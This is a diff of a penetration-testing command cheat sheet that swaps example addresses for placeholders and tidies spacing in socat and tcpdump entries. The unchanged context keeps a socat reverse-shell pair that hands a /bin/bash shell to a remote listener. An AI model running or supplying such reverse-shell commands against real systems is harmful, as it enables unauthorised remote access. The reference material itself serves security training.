@@ -635,7 +635,7 @@ socat - OPENSSL:<IP>:<PORT>,verify=0                                            
 
 **Reverse Shell**
 ```
-socat -d -d TCP4-LISTEN:<PORT> STDOUT                                           User 1, create a listener
+socat -d -d TCP4-LISTEN:<PORT> STDOUT                                     User 1, create a listener
 socat TCP4:<IP>:<PORT> EXEC:/bin/bash                                     User 2, send reverse shell to User 1
 ```
 
@@ -737,9 +737,9 @@ tcpdump -r packets.pcap                                                         
 tcpdump -n -r packets.pcap | awk -F" " '{print $3}' | sort | uniq -c | head       Read and filter the packet capture;
                                                                                   -n option to skip DNS name lookups, -r to read from our packet capture file
                                                                                   awk to print the destination IP address and port, sort and uniq -c to sort and count the number of times the field appears in the capture, respectively, head to only display the first 10 lines of the output
-tcpdump -n src host 172.16.40.10 -r packets.pcap                                  Tcpdump filters; src host to output only source traffic
-tcpdump -n dst host 172.16.40.10 -r packets.pcap                                  Tcpdump filters; dst host to output only destination traffic
-tcpdump -n port 81 -r packets.pcap                                                Tcpdump filters; filter by port number
+tcpdump -n src host <IP> -r packets.pcap                                          Tcpdump filters; src host to output only source traffic
+tcpdump -n dst host <IP> -r packets.pcap                                          Tcpdump filters; dst host to output only destination traffic
+tcpdump -n port <PORT> -r packets.pcap                                            Tcpdump filters; filter by port number
 tcpdump -nX -r packets.pcap                                                       -X to print packet data in both HEX and ASCII format
 ```
 
